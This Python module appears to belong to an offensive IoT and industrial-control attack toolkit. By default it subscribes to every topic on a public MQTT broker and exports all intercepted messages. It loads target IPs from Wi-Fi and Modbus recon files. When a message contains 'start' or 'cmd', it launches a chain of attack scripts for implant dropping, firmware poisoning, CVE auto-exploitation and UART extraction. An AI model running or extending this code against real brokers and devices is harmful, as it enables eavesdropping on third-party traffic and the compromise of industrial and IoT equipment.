
# modules/attacks/mqttex_hijack.py

import paho.mqtt.client as mqtt
import time
import json
import threading
import socket
import os
import sys
from pathlib import Path
from datetime import datetime
import websocket

# Constants
DEFAULT_BROKER = "broker.hivemq.com"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "#"
RECON_WIFI_FILE = "recon/wifi_scan_results.json"
RECON_MODBUS_FILE = "recon/modbus_scan_results.json"
MQTT_EXPORT_FILE = "reports/mqtt_payloads.json"
ALERT_FILE = "webgui/alerts.json"
KILLCHAIN_FILE = "reports/killchain.json"
CHAIN_SCRIPT_1 = "implant_dropper.py"
CHAIN_SCRIPT_2 = "modules/firmware/firmware_poisoner.py"
CHAIN_SCRIPT_3 = "modules/firmware/cve_autopwn.py"
CHAIN_SCRIPT_4 = "modules/hardware/uart_extractor.py"
CHAIN_SCRIPT_5 = "modules/report_builder.py"
WS_DASHBOARD_URI = "ws://localhost:8765"

AGENT_ID = "mqtt_agent"
os.makedirs("reports", exist_ok=True)
os.makedirs("webgui", exist_ok=True)

# Globals
mqtt_messages = []
payload_export = []
client = None

def log(msg):
    timestamp = datetime.utcnow().isoformat()
    full_msg = f"[{timestamp}] [MQTTX] {msg}"
    print(full_msg)
    with open("reports/mqttex_hijack.log", "a") as f:
        f.write(full_msg + "\n")

def push_alert_websocket(message):
    try:
        ws = websocket.create_connection(WS_DASHBOARD_URI, timeout=3)
        ws.send(json.dumps({
            "agent": AGENT_ID,
            "alert": message,
            "type": "exploit",
            "timestamp": time.time()
        }))
        ws.close()
    except Exception as e:
        log(f"WebSocket alert failed: {e}")

def push_alert_file():
    try:
        with open(ALERT_FILE, "a") as f:
            f.write(json.dumps({
                "agent": AGENT_ID,
                "alert": "MQTT hijack in progress",
                "type": "exploit",
                "timestamp": time.time()
            }) + "\n")
    except Exception as e:
        log(f"File alert failed: {e}")

def update_killchain(event):
    entry = {
        "agent": AGENT_ID,
        "event": event,
        "time": time.time()
    }
    try:
        with open(KILLCHAIN_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception as e:
        log(f"Killchain update failed: {e}")

def export_payload(topic, payload):
    payload_export.append({
        "timestamp": time.time(),
        "topic": topic,
        "payload": payload
    })
    with open(MQTT_EXPORT_FILE, "w") as f:
        json.dump(payload_export, f, indent=2)

def auto_chain_attacks():
    log("Triggering: implant → firmware poison → CVE autopwn → UART flash → report")
    os.system(f"python3 {CHAIN_SCRIPT_1}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_2}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_3}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_4}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_5}")

def on_connect(client, userdata, flags, rc):
    log(f"Connected with result code {rc}")
    client.subscribe(userdata['topic'])

def on_message(client, userdata, msg):
    payload = msg.payload.decode(errors='ignore')
    log(f"Message on {msg.topic}: {payload}")
    export_payload(msg.topic, payload)
    update_killchain(f"MQTT payload received: {msg.topic}")

    if "start" in payload or "cmd" in payload:
        log("Trigger condition met. Executing chained attacks.")
        push_alert_file()
        push_alert_websocket("Trigger detected on MQTT channel")
        auto_chain_attacks()

def get_targets_from_recon():
    targets = []
    for file_path in [RECON_WIFI_FILE, RECON_MODBUS_FILE]:
        if Path(file_path).exists():
            try:
                with open(file_path) as f:
                    data = json.load(f)
                    for item in data if isinstance(data, list) else data.values():
                        ip = item.get("ip") or item.get("host") or item.get("target")
                        if ip:
                            targets.append(ip)
            except Exception as e:
                log(f"Failed to load recon targets: {e}")
    return targets

def start_client(broker, topic):
    userdata = {'topic': topic}
    mqtt_client = mqtt.Client(userdata=userdata)
    mqtt_client.on_connect = on_connect
    mqtt_client.on_message = on_message
    try:
        mqtt_client.connect(broker, DEFAULT_PORT, 60)
        mqtt_client.loop_forever()
    except socket.error as e:
        log(f"Socket error: {e}")
        return

def main():
    log("Launching MQTT Hijack Module")
    push_alert_file()
    push_alert_websocket("MQTT hijack module started")
    update_killchain("MQTT hijack module launched")

    # Prompt user for broker/topic or use defaults
    broker = input(f"MQTT Broker [{DEFAULT_BROKER}]: ") or DEFAULT_BROKER
    topic = input(f"Topic to subscribe [{DEFAULT_TOPIC}]: ") or DEFAULT_TOPIC

    # Optionally print known targets
    targets = get_targets_from_recon()
    if targets:
        log(f"Discovered targets: {targets}")

    start_client(broker, topic)

if __name__ == "__main__":
    main()
